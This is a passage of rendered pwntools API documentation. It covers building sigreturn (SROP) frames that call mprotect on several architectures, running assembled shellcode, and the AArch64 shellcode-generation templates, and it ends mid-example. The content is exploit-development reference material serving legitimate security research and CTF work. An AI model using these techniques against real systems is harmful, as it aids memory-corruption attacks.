<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1073741840, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1447448577, 288]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">r0</span> <span class="o">=</span> <span class="mi">125</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">r1</span> <span class="o">=</span> <span class="mh">0x00601000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">r2</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">r3</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">240</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 6, 0, 0, 125, 6295552, 4096, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1073741840, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1447448577, 288]</span>
</pre></div>
</div>
<p>Crafting a SigreturnFrame that calls mprotect on MIPS</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;big&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;mips&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">v0</span> <span class="o">=</span> <span class="mh">0x101d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a0</span> <span class="o">=</span> <span class="mh">0x00601000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a1</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a2</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">296</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4125, 0, 0, 0, 6295552, 0, 4096, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
</pre></div>
</div>
<p>Crafting a SigreturnFrame that calls mprotect on MIPSel</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;mips&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">v0</span> <span class="o">=</span> <span class="mh">0x101d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a0</span> <span class="o">=</span> <span class="mh">0x00601000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a1</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">a2</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">292</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4125, 0, 0, 0, 6295552, 0, 4096, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
</pre></div>
</div>
<p>Crafting a SigreturnFrame that calls mprotect on Aarch64</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;aarch64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1179680769, 528]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">x8</span> <span class="o">=</span> <span class="mh">0xe2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">x0</span> <span class="o">=</span> <span class="mh">0x4000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">x1</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">x2</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">600</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16384, 0, 4096, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 226, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1179680769, 528]</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.rop.srop.SigreturnFrame.set_regvalue">
<code class="descname">set_regvalue</code><span class="sig-paren">(</span><em>reg</em>, <em>val</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/srop.py#L455-459"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.srop.SigreturnFrame.set_regvalue" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets a specific <code class="docutils literal"><span class="pre">reg</span></code> to a <code class="docutils literal"><span class="pre">val</span></code></p>
</dd></dl>

</dd></dl>

</div>
</div>
</div>
</div>
<span id="document-runner"></span><div class="section" id="module-pwnlib.runner">
<span id="pwnlib-runner-running-shellcode"></span><h3><a class="reference internal" href="#module-pwnlib.runner" title="pwnlib.runner"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.runner</span></code></a> &#8212; Running Shellcode<a class="headerlink" href="#module-pwnlib.runner" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.runner.run_assembly">
<code class="descclassname">pwnlib.runner.</code><code class="descname">run_assembly</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/runner.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.runner.run_assembly" title="Permalink to this definition">¶</a></dt>
<dd><p>Given an assembly listing, assemble and execute it.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a> tube to interact with the process.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="s1">&#39;mov ebx, 3; mov eax, SYS_exit; int 0x80;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">3</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="s1">&#39;mov r0, #12; mov r7, #1; svc #0&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">12</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.runner.run_shellcode">
<code class="descclassname">pwnlib.runner.</code><code class="descname">run_shellcode</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/runner.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.runner.run_shellcode" title="Permalink to this definition">¶</a></dt>
<dd><p>Given assembled machine code bytes, execute them.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">bytes</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov ebx, 3; mov eax, SYS_exit; int 0x80;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_shellcode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">3</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">bytes</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r0, #12; mov r7, #1; svc #0&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_shellcode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">12</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.runner.run_assembly_exitcode">
<code class="descclassname">pwnlib.runner.</code><code class="descname">run_assembly_exitcode</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/runner.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.runner.run_assembly_exitcode" title="Permalink to this definition">¶</a></dt>
<dd><p>Given an assembly listing, assemble and execute it, and wait for
the process to die.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">The exit code of the process.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly_exitcode</span><span class="p">(</span><span class="s1">&#39;mov ebx, 3; mov eax, SYS_exit; int 0x80;&#39;</span><span class="p">)</span>
<span class="go">3</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.runner.run_shellcode_exitcode">
<code class="descclassname">pwnlib.runner.</code><code class="descname">run_shellcode_exitcode</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/runner.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.runner.run_shellcode_exitcode" title="Permalink to this definition">¶</a></dt>
<dd><p>Given assembled machine code bytes, execute them, and wait for
the process to die.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">The exit code of the process.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">bytes</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov ebx, 3; mov eax, SYS_exit; int 0x80;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_shellcode_exitcode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">)</span>
<span class="go">3</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-shellcraft"></span><div class="section" id="module-pwnlib.shellcraft">
<span id="pwnlib-shellcraft-shellcode-generation"></span><h3><a class="reference internal" href="#module-pwnlib.shellcraft" title="pwnlib.shellcraft"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft</span></code></a> &#8212; Shellcode generation<a class="headerlink" href="#module-pwnlib.shellcraft" title="Permalink to this headline">¶</a></h3>
<p>The shellcode module.</p>
<p>This module contains functions for generating shellcode.</p>
<p>It is organized first by architecture and then by operating system.</p>
<div class="section" id="submodules">
<h4>Submodules<a class="headerlink" href="#submodules" title="Permalink to this headline">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-shellcraft/aarch64"></span><div class="section" id="pwnlib-shellcraft-aarch64-shellcode-for-aarch64">
<h5><a class="reference internal" href="#module-pwnlib.shellcraft.aarch64" title="pwnlib.shellcraft.aarch64"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.aarch64</span></code></a> &#8212; Shellcode for AArch64<a class="headerlink" href="#pwnlib-shellcraft-aarch64-shellcode-for-aarch64" title="Permalink to this headline">¶</a></h5>
<div class="section" id="pwnlib-shellcraft-aarch64">
<h6><a class="reference internal" href="#module-pwnlib.shellcraft.aarch64" title="pwnlib.shellcraft.aarch64"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.aarch64</span></code></a><a class="headerlink" href="#pwnlib-shellcraft-aarch64" title="Permalink to this headline">¶</a></h6>
<span class="target" id="module-pwnlib.shellcraft.aarch64"></span><dl class="function">
<dt id="pwnlib.shellcraft.aarch64.breakpoint">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">breakpoint</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/breakpoint.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.breakpoint" title="Permalink to this definition">¶</a></dt>
<dd><p>Inserts a debugger breakpoint (raises SIGTRAP).</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">breakpoint</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-5</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.crash">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">crash</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/crash.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.crash" title="Permalink to this definition">¶</a></dt>
<dd><p>Crashes the process.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">crash</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-11</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.infloop">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">infloop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/infloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.infloop" title="Permalink to this definition">¶</a></dt>
<dd><p>An infinite loop.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">infloop</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.mov">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.mov" title="Permalink to this definition">¶</a></dt>
<dd><p>Move src into dest.</p>
<p>Support for automatically avoiding newline and null bytes has to be done.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;arm&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;x0&#39;</span><span class="p">,</span><span class="s1">&#39;x1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  x0, x1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;x0&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  x0, xzr</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;x0&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  x0, #5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;x0&#39;</span><span class="p">,</span> <span class="mh">0x34532</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* Set x0 = 214322 = 0x34532 */</span>
<span class="go">    mov  x0, #17714</span>
<span class="go">    movk x0, #3, lsl #16</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>dest</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The destination register.</li>
<li><strong>src</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Either the input register, or an immediate value.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.push">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">push</code><span class="sig-paren">(</span><em>value</em>, <em>register1='x14'</em>, <em>register2='x15'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a value onto the stack without using null bytes or newline characters.</p>
<p>If src is a string, then we try to evaluate using <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>
before determining how to push it.</p>
<p>Note that this means that this shellcode can change behavior depending on
the value of <cite>context.os</cite>.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">AArch64 requires that the stack remain 16-byte aligned at all times,
so this alignment is preserved.</p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>value</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The value or register to push</li>
<li><strong>register1</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Scratch register to use</li>
<li><strong>register2</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Second scratch register to use</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0 */</span>
<span class="go">    mov  x14, xzr</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 1 */</span>
<span class="go">    mov  x14, #1</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0x100 */</span>
